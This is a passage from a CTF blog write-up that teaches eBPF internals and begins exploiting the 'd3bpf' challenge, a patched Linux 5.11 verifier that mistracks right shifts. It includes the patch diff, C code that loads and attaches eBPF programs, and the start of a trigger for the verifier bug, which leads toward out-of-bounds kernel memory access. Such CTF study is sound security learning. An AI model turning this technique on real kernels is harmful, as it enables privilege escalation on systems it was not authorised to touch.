<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Learning eBPF exploitation</title>
	
	<meta name="author" content="stdnoerr">

	<!-- Enable responsive viewport -->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
	<!--[if lt IE 9]>
	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->

	<!-- Le styles -->
	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
	<link href="/assets/css/style.css" rel="stylesheet">

	<!-- Le fav and touch icons -->
	<!-- Update these with your own images
	<link rel="shortcut icon" href="images/favicon.ico">
	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
	-->

	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
</head>

<body>
	<nav class="navbar navbar-default visible-xs" role="navigation">
		<!-- Brand and toggle get grouped for better mobile display -->
		<div class="navbar-header">
			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			
			<a type="button" class="navbar-toggle nav-link" href="http://github.com/stdnoerr">
				<i class="fa fa-github"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/stdnoerr">
				<i class="fa fa-twitter"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="mailto:stdnoerr@gmail.com">
				<i class="fa fa-envelope"></i>
			</a>
			
			<a class="navbar-brand" href="/">
				<img src="//www.gravatar.com/avatar/fe66ffe3df09aee77973014c55d36d1c?s=35" class="img-circle" />
				stdnoerr's blog
			</a>
		</div>

		<!-- Collect the nav links, forms, and other content for toggling -->
		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
			<ul class="nav navbar-nav">
				<li class="active"><a href="/">Home</a></li>
				<li><a href="/categories.html">Categories</a></li>
				<li><a href="/tags.html">Tags</a></li>
			</ul>
		</div><!-- /.navbar-collapse -->
	</nav>

	<!-- nav-menu-dropdown -->
	<div class="btn-group hidden-xs" id="nav-menu">
		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
			<i class="fa fa-bars"></i>
		</button>
		<ul class="dropdown-menu" role="menu">
			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
			<li class="divider"></li>
			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
		</ul>
	</div>

	<div class="col-sm-3 sidebar hidden-xs" style="background: url(/assets/media/cover.jpg) no-repeat !important;">
		<!-- sidebar.html -->
<header class="sidebar-header" role="banner">
	<a href="/">
		<img src="//www.gravatar.com/avatar/fe66ffe3df09aee77973014c55d36d1c?s=150" class="img-circle" />
	</a>
	<h3 class="title">
        <a href="/">stdnoerr's blog</a>
    </h3>
</header>


<div id="bio" class="text-center">
	CTFer | pwner | wanna learn everything
</div>


<div id="contact-list" class="text-center">
	<ul class="list-unstyled list-inline">
		
		<li>
			<a class="btn btn-default btn-sm" href="https://github.com/stdnoerr">
				<i class="fa fa-github-alt fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="https://twitter.com/stdnoerr">
				<i class="fa fa-twitter fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="mailto:stdnoerr@gmail.com">
				<i class="fa fa-envelope fa-lg"></i>
			</a>
		</li>
		
	</ul>
	<ul id="contact-list-secondary" class="list-unstyled list-inline">
		
		
	</ul>
</div>
<!-- sidebar.html end -->

	</div>

	<div class="col-sm-9 col-sm-offset-3">
		<div class="page-header">
  <h1>Learning eBPF exploitation </h1>
</div>
	
<article>

	<div class="col-sm-10">
	 <span class="post-date">
	   
	   August 
	   21st,
	     
	   2022
	 </span>
	  <div class="article_body">
	  <p>This post is gonna be about eBPF exploitation using a CTF challenge from D^3CTF named <code class="language-plaintext highlighter-rouge">d3bpf</code>. I have learnt so much while trying this challenge that I want to document all those findings and understanding as a future reference. All snippets gonna be from <code class="language-plaintext highlighter-rouge">v5.11</code> kernel as the challenge uses this version. Lets dig right in.</p>

<h1 id="ebpf">(e)BPF</h1>
<h2 id="what-is-ebpf">What is eBPF?</h2>
<p><code class="language-plaintext highlighter-rouge">eBPF</code> stands for <code class="language-plaintext highlighter-rouge">extended Berkeley Packet Filter</code>. Originally, <code class="language-plaintext highlighter-rouge">BPF</code> was intended for, as the name suggests, packet filtering. But because of its ease-of-use, it was later extended to <code class="language-plaintext highlighter-rouge">eBPF</code>. It provides a small instruction set for implementing various kinds of kernel programs which can be added to any supporting kernel version. Some example programs would be <a href="https://docs.kernel.org/trace/kprobes.html">kprobe</a> and packet filters. The provided code will be added to the kernel and will run under the kernel’s context. This very feature made it the prime target of vulnerability researchers.<br />
Initially, <code class="language-plaintext highlighter-rouge">eBPF</code> was allowed for all users (a few type of programs).</p>

<h2 id="ebpf-programs">eBPF programs</h2>
<p>eBPF code is given to the kernel in form of a <code class="language-plaintext highlighter-rouge">eBPF program</code>. Each type of eBPF program have their own capabilities and features. One example would be <code class="language-plaintext highlighter-rouge">BPF_PROG_TYPE_SOCKET_FILTER</code>. This type of program are used for packer filtering and are attached to a particular socket, which is owned by the user. Whenever the socket receives a packet, the eBPF program is executed for performing packet filtering.<br />
eBPF programs undergo checking by the kernel mechanism called <code class="language-plaintext highlighter-rouge">eBPF verifier</code>. eBPF verifier checks the program for potentially illegal or dangerous functionality. If the program makes it past the verifier, only then it is included into the kernel. eBPF programs also have a <code class="language-plaintext highlighter-rouge">512</code> byte-sized stack. <a href="https://elixir.bootlin.com/linux/v5.11/source/include/linux/filter.h#L525">struct</a></p>

<h2 id="ebpf-maps">eBPF Maps</h2>
<p>The main mechanism for interacting with eBPF programs is eBPF Maps. Maps are created by the user. They are key-value pairs. There are two main types of Maps, array or hash-table.<br />
In case of array map, key is the index and value are bytes at that index. While creating Maps, user can provide key size, value size and no. of entries. Key size cannot be greater than 4 bytes but value size and no. of entries can be arbitrary. This makes a buffer in the kernel. Each map has a set of <a href="https://elixir.bootlin.com/linux/v5.11/source/include/linux/bpf.h#L59">operations</a> defined. <a href="https://elixir.bootlin.com/linux/v5.11/source/include/linux/bpf.h#L141">struct</a></p>

<h2 id="ebpf-instruction-set">eBPF instruction set</h2>
<p>Covering full eBPF instruction set is out of scope of this article, I will only explain a few things. You can read about eBPF instruction in detail <a href="https://www.kernel.org/doc/html/latest/bpf/instruction-set.html">here</a>. eBPF provides ten registers <code class="language-plaintext highlighter-rouge">BPF_REG_{0..10}</code>. <code class="language-plaintext highlighter-rouge">BPF_REG_{1..5}</code> are used for calling functions (more on this later). The return value is stored in <code class="language-plaintext highlighter-rouge">BPF_REG_0</code> and <code class="language-plaintext highlighter-rouge">BPF_REG_10</code> is frame pointer for eBPF stack. When an eBPF program is ran, <code class="language-plaintext highlighter-rouge">BPF_REG_1</code> contains pointer to eBPF context which contains some information about the eBPF program.<br />
In eBPF terminology, immediates are called scalars and pointers are any values which are derived from pointers.
It means that you can only get <a href="https://elixir.bootlin.com/linux/v5.11/source/include/linux/bpf.h#L376">certain types</a> of pointers in eBPF and we can obtain these pointers using eBPF defined routines or registers already containing pointers (<code class="language-plaintext highlighter-rouge">BPF_REG_1</code>, <code class="language-plaintext highlighter-rouge">PTR_TO_CTX</code> (context) and <code class="language-plaintext highlighter-rouge">BPF_REG_10</code>, <code class="language-plaintext highlighter-rouge">PTR_TO_STACK</code> (fp)) (e.g. <code class="language-plaintext highlighter-rouge">CONST_PTR_TO_MAP</code> can be obtained using <code class="language-plaintext highlighter-rouge">BPF_LD_MAP_FD</code> instruction and <code class="language-plaintext highlighter-rouge">PTR_TO_MAP_VALUE_OR_NULL</code> can be obtained using <code class="language-plaintext highlighter-rouge">bpf_map_lookup_elem</code> function). You <strong>cannot</strong> treat an arbitrary value as a pointer since that is inherently dangerous in kernel context (in which eBPF programs execute). By default, all user-defined values (values in maps, values on stack etc) are considered scalars (immediates) and can only be converted to pointers by performing (allowed) pointer arithmetic with previously mentioned pointers. Lastly, arithmetic between two pointers results in a scalar.
<br /> To put a scalar into (say) BPF_REG_1:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BPF_MOV64_IMM(BPF_REG_1, 1337)
</code></pre></div></div>
<p>Almost every instruction has a 32-bit and 64-bit variant and almost every instruction has a version for register and immediate. For example to put a 32-bit scalar to BPF_REG_1 and move BPF_REG_1 to BPF_REG_2:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BPF_MOV32_IMM(BPF_REG_1, 1337)
BPF_MOV64_REG(BPF_REG_2, BPF_REG_1)
</code></pre></div></div>
<p>You can perform mathematical operations using <code class="language-plaintext highlighter-rouge">ALU{32,64}</code> on registers using the following syntax:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BPF_ALU{32,64}_{IMM,REG}(P, BPF_REG_DEST, BPF_REG|IMM)
e.g. BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1337)
</code></pre></div></div>
<p>You can perform addition, subtraction, multiplication, division, and bit shifting on scalars.<br />
For pointers, only addition and subtraction are allowed.<br />
Every eBPF program should end in an exit instruction:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BPF_EXIT_INSN()
</code></pre></div></div>
<p>For loading and storing values from memory using pointers, you can used following instructions:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BPF_LDX_MEM(SIZE, BPF_REG_SRC, BPF_REG_DEST, OFFSET)
BPF_STX_MEM(SIZE, BPF_REG_DEST, BPF_REG_SRC, OFFSET)

e.g.
BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_2, 0) -&gt; BPF_REG_2 = *(u64 *)(BPF_REG_1 + 0)
BPF_STX_MEM(BPF_DW, BPF_REG_1, BPF_REG_2, 0) -&gt; *(u64 *)(BPF_REG_1 + 0) = BPF_REG_2
</code></pre></div></div>
<p>eBPF also provides logical jumps:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BPF_JMP_IMM(BPF_JNE, BPF_REG_1, 0, 1)
BPF_EXIT_INSN()
</code></pre></div></div>
<p>eBPF provides a few functions which can be called in eBPF programs. We will only be using map functions in this case. For map functions (<code class="language-plaintext highlighter-rouge">BPF_FUNC_map_{name}</code>), <code class="language-plaintext highlighter-rouge">BPF_REG_6</code> should contain pointer to context and <code class="language-plaintext highlighter-rouge">BPF_REG_{1..5}</code> contain the arguments. After a call, <code class="language-plaintext highlighter-rouge">BPF_REG_{1..5}</code> contain no values (set to unknown) because they are caller-saved registers and other registers are callee-saved registers. All map function require the map pointer to be in <code class="language-plaintext highlighter-rouge">BPF_REG_1</code>. Following is call example:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BPF_MOV64_REG(BPF_REG_2, BPF_REG_10)
BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4)
BPF_LD_MAP_FD(BPF_REG_1, &lt;map fd&gt;)
BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem)
</code></pre></div></div>
<p>If your program is of type <code class="language-plaintext highlighter-rouge">BPF_PROG_TYPE_SOCKET_FILTER</code>, you can use following instruction to load values from the <code class="language-plaintext highlighter-rouge">sk_buff</code> buffer:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BPF_LD_ABS(SIZE, OFF)
</code></pre></div></div>
<p>Note that this will also clear the caller-saved registers.<br />
I think this is enough.</p>

<p>For example programs, look at <a href="https://elixir.bootlin.com/linux/latest/source/samples/bpf">this link</a>.</p>

<h2 id="ebpf-verifier">eBPF verifier</h2>
<p>eBPF verifier is the most important component in eBPF as it ensures that no dangerous program will get executed.
In a nutshell, the verifier (<code class="language-plaintext highlighter-rouge">bpf_check</code>) visits each instruction and perform checks specific to the instruction and the context it is running in. For example, if we’re performing a pointer arithmetic operation, it needs to make sure that we don’t break out of the allowed area.<br />
For this purpose, it keeps track of all register states based on previous operations and updates the register states after visiting an instruction. The register state is stored in a struct named <a href="https://elixir.bootlin.com/linux/v5.11/source/include/linux/bpf_verifier.h#L44"><code class="language-plaintext highlighter-rouge">bpf_reg_state</code></a>. It keeps track of min and max values, signed and unsigned both.<br />
Verifier blocks uninitialised memory/register access, oob pointer arithmetic, storing pointers in maps, returning pointers, invalid arguments for function calls etc.<br />
Here eBPF verifier is kinda like the typer in chrome/chromium. It keeps track of everything and makes speculations based on the information it has. And like the typer, it has bugs which can be used to mislead the verifier into making wrong assumptions about the program. But, like the typer, it also adds runtime checks for the speculations it makes.</p>

<h2 id="alu-sanitation">ALU Sanitation</h2>
<p>ALU Sanitation is part of verifier which enforces the eBPF speculations at runtime. If the program is given by root, then there’s no ALU Sanitation as root can already read kernel pointer using kallsyms. ALU Sanitation is done on pointers. Before each addition or subtraction (on pointers), following instructions are added:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BPF_MOV32_IMM</span><span class="p">(</span><span class="n">BPF_REG_AX</span><span class="p">,</span> <span class="n">aux</span><span class="o">-&gt;</span><span class="n">alu_limit</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">// -1 in old kernel versions</span>
<span class="n">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_SUB</span><span class="p">,</span> <span class="n">BPF_REG_AX</span><span class="p">,</span> <span class="n">off_reg</span><span class="p">);</span>
<span class="n">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_OR</span><span class="p">,</span> <span class="n">BPF_REG_AX</span><span class="p">,</span> <span class="n">off_reg</span><span class="p">);</span>
<span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_NEG</span><span class="p">,</span> <span class="n">BPF_REG_AX</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ARSH</span><span class="p">,</span> <span class="n">BPF_REG_AX</span><span class="p">,</span> <span class="mi">63</span><span class="p">);</span>
<span class="n">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_AND</span><span class="p">,</span> <span class="n">BPF_REG_AX</span><span class="p">,</span> <span class="n">off_reg</span><span class="p">);</span>
</code></pre></div></div>
<p>Here <code class="language-plaintext highlighter-rouge">BPF_REG_AX</code> is auxiliary register used by eBPF, <code class="language-plaintext highlighter-rouge">off_reg</code> is the register containing the offset to be added/subtracted from the pointer and <code class="language-plaintext highlighter-rouge">alu_limit</code> is the maximum value allowed for that operation. This set of instruction basically ensure that no value greater than <code class="language-plaintext highlighter-rouge">alu_limit - 1</code> gets added/subtraction from the pointer.
<code class="language-plaintext highlighter-rouge">alu_limit</code> is calculated based on the verifier’s information about that register.<br />
But If the information the verifier have is wrong than <code class="language-plaintext highlighter-rouge">alu_limit</code> is wrong and hence the whole thing can be bypassed.<br />
Lets take an example, suppose that a pointer is at <code class="language-plaintext highlighter-rouge">0x1000</code> and it is allowed to go upto <code class="language-plaintext highlighter-rouge">0x2500</code>. Then using some vulnerability we make the verifier think that the pointer is still at <code class="language-plaintext highlighter-rouge">0x1000</code> but actually it is <code class="language-plaintext highlighter-rouge">0x0</code>. In this case, the <code class="language-plaintext highlighter-rouge">alu_limit</code> for subtraction and addition will be <code class="language-plaintext highlighter-rouge">0x1000</code> and <code class="language-plaintext highlighter-rouge">0x1500</code> respectively. Hence we can access, <code class="language-plaintext highlighter-rouge">0x1000</code> data before that pointer (OOB read/write). This problem is highlighted <a href="https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification">here</a>.<br />
But what if <code class="language-plaintext highlighter-rouge">alu_limit == 0</code>?
Then ALU Sanitation will enforce a limit of <code class="language-plaintext highlighter-rouge">0xffffffff</code>. So we can add or subtract any 32-bit value.<br />
This bug was fixed in new kernel versions.</p>

<h2 id="ebpf-execution">eBPF Execution</h2>
<p>If the program makes it past the verifier then (based on kernel config) it is either set to be interpreted at runtime or jited to machine code.</p>

<h1 id="d3bpf">d3bpf</h1>
<p>The challenge files are available <a href="https://github.com/chujDK/d3ctf2022-pwn-d3bpf-and-v2/blob/main/d3bpf/attachment/d3bpf-fe89139cf452491fc88158f672848c50a372e2ce6811644b28035361ea4fbd01.zip">here</a>.</p>

<h2 id="patch-analysis">Patch analysis</h2>
<p>The challenge adds a patch to one of the verifier functions for <code class="language-plaintext highlighter-rouge">BPF_RSH</code> (bitwise right shift).</p>
<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
index 37581919e..8e98d4af5 100644
</span><span class="gd">--- a/kernel/bpf/verifier.c
</span><span class="gi">+++ b/kernel/bpf/verifier.c
</span><span class="p">@@ -6455,11 +6455,11 @@</span> static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,
             scalar_min_max_lsh(dst_reg, &amp;src_reg);
         break;
     case BPF_RSH:
<span class="gd">-        if (umax_val &gt;= insn_bitness) {
-            /* Shifts greater than 31 or 63 are undefined.
-             * This includes shifts by a negative number.
-             */
-            mark_reg_unknown(env, regs, insn-&gt;dst_reg);
</span><span class="gi">+        if (umin_val &gt;= insn_bitness) {
+            if (alu32)
+                __mark_reg32_known(dst_reg, 0);
+            else
+                __mark_reg_known_zero(dst_reg);
</span>             break;
         }
         if (alu32)
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">adjust_scalar_min_max_vals</code> function is called whenever an instruction is visited to update the verifier state information about scalar regiters involved.<br />
To break it down, if the unsigned mininum value (umin_val) of a register is greater than the instruction bit size (<code class="language-plaintext highlighter-rouge">insn_bitness</code>) (32 or 64) then the register is set to be known to contain <code class="language-plaintext highlighter-rouge">0</code>. This in simple terms means that if a 64 bit value is right shifted by a value greater than or equal to 64 then it contains <code class="language-plaintext highlighter-rouge">0</code> and same is true for 32 bit values.<br />
Intuitively, it seems right that if a value is right shifted by a value greater than its size then it should contain zero. Then why did the original code say that shifts greater than 31/63 are undefined? <br />
Lets verify the new code. I read the Intel instruction manual, there shifts are implemented by first applying a mask on the value by which the shifting is to be done. The mask (in 64-bit mode) is <code class="language-plaintext highlighter-rouge">0x3f</code>. So, when we do <code class="language-plaintext highlighter-rouge">shr rax, 64</code>, shift is done as <code class="language-plaintext highlighter-rouge">shr rax, 64 &amp; 0x3f</code>. <code class="language-plaintext highlighter-rouge">64 &amp; 0x3f</code> is <code class="language-plaintext highlighter-rouge">0</code>. Therefore, there is no shifting done and the original value remains unchanged. But the verifier assumes that it will be zero, in contrast the actual value can be anything.<br />
The given kernel is compiled with <code class="language-plaintext highlighter-rouge">CONFIG_BPF_JIT_ALWAYS_ON</code> and will always compile the eBPF program to machine code.</p>

<h2 id="triggering-vuln">Triggering vuln</h2>
<p>My first attempt was following:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;syscall.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/bpf.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"bpf_insn.h"</span><span class="cp">
</span>
<span class="kt">int</span> <span class="n">socks</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="o">-</span><span class="mi">1</span><span class="p">};</span>

<span class="kt">int</span> <span class="nf">bpf</span><span class="p">(</span><span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="k">union</span> <span class="n">bpf_attr</span> <span class="o">*</span><span class="n">attr</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">attr</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">bpf_prog_load</span><span class="p">(</span><span class="k">union</span> <span class="n">bpf_attr</span> <span class="o">*</span><span class="n">attr</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">bpf</span><span class="p">(</span><span class="n">BPF_PROG_LOAD</span><span class="p">,</span> <span class="n">attr</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">union</span> <span class="n">bpf_attr</span><span class="o">*</span> <span class="nf">create_bpf_prog</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="n">insns</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">insn_cnt</span><span class="p">){</span>
    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="o">*</span><span class="n">attr</span> <span class="o">=</span> <span class="p">(</span><span class="k">union</span> <span class="n">bpf_attr</span> <span class="o">*</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">union</span> <span class="n">bpf_attr</span><span class="p">));</span>

    <span class="n">attr</span><span class="o">-&gt;</span><span class="n">prog_type</span> <span class="o">=</span> <span class="n">BPF_PROG_TYPE_SOCKET_FILTER</span><span class="p">;</span>
    <span class="n">attr</span><span class="o">-&gt;</span><span class="n">insn_cnt</span> <span class="o">=</span> <span class="n">insn_cnt</span><span class="p">;</span>
    <span class="n">attr</span><span class="o">-&gt;</span><span class="n">insns</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="n">insns</span><span class="p">;</span>
    <span class="n">attr</span><span class="o">-&gt;</span><span class="n">license</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="s">""</span><span class="p">;</span>

    <span class="k">return</span> <span class="n">attr</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">attach_socket</span><span class="p">(</span><span class="kt">int</span> <span class="n">prog_fd</span><span class="p">){</span>
    <span class="k">if</span><span class="p">(</span><span class="n">socks</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">socketpair</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">SOCK_DGRAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">socks</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"socketpair"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="k">if</span><span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socks</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_ATTACH_BPF</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">prog_fd</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">prog_fd</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"setsockopt"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">setup_bpf_prog</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="n">insns</span><span class="p">,</span> <span class="n">uint</span> <span class="n">insncnt</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">log_buffer</span><span class="p">[</span><span class="mh">0x4000</span><span class="p">];</span>

    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="o">*</span><span class="n">prog</span> <span class="o">=</span> <span class="n">create_bpf_prog</span><span class="p">(</span><span class="n">insns</span><span class="p">,</span> <span class="n">insncnt</span><span class="p">);</span>

    <span class="n">prog</span><span class="o">-&gt;</span><span class="n">log_level</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">prog</span><span class="o">-&gt;</span><span class="n">log_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="n">log_buffer</span><span class="p">;</span>
    <span class="n">prog</span><span class="o">-&gt;</span><span class="n">log_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">log_buffer</span><span class="p">);</span>
    <span class="n">strncpy</span><span class="p">(</span><span class="n">prog</span><span class="o">-&gt;</span><span class="n">prog_name</span><span class="p">,</span> <span class="s">"stdnoerr"</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">prog_fd</span> <span class="o">=</span> <span class="n">bpf_prog_load</span><span class="p">(</span><span class="n">prog</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">log_buffer</span><span class="p">));</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">log_buffer</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">prog_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"prog_load"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">attach_socket</span><span class="p">(</span><span class="n">prog_fd</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">run_bpf_prog</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="n">insns</span><span class="p">,</span> <span class="n">uint</span> <span class="n">insncnt</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">setup_bpf_prog</span><span class="p">(</span><span class="n">insns</span><span class="p">,</span> <span class="n">insncnt</span><span class="p">);</span>
    <span class="n">write</span><span class="p">(</span><span class="n">socks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">val</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">val</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="k">struct</span> <span class="n">bpf_insn</span> <span class="n">insns</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
        <span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mh">0x1337</span><span class="p">),</span>
        <span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_RSH</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">64</span><span class="p">),</span>
        <span class="n">BPF_EXIT_INSN</span><span class="p">()</span>
    <span class="p">};</span>

    <span class="n">run_bpf_prog</span><span class="p">(</span><span class="n">insns</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">insns</span><span class="p">)</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="n">insns</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>
<span class="p">}</span>
</code></pre></div></div>
<p>I set a breakpoint at <code class="language-plaintext highlighter-rouge">*sk_filter_trim_cap + 140</code> to see the code in action.
The code compilation failed with the following logger buffer output</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>func#0 @0
0: R1=ctx(id=0,off=0,imm=0) R10=fp0
0: (b7) r0 = 4919
1: R0_w=invP4919 R1=ctx(id=0,off=0,imm=0) R10=fp0
1: (77) r0 &gt;&gt;= 64
invalid shift 64
processed 2 insns (limit 1000000) max_states_per_insn 0 total_states 0 peak_states 0 mark_read 0
</code></pre></div></div>
<p>This error is because of <a href="https://elixir.bootlin.com/linux/v5.11/source/kernel/bpf/verifier.c#L6737">this line</a>.
The verifier actually already has a check for invalid shifts. But this check is only for immediate values.<br />
If we put <code class="language-plaintext highlighter-rouge">64</code> in another register and use that for shifting, we trigger the vuln.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mh">0x1337</span><span class="p">),</span>
<span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="mi">64</span><span class="p">),</span>
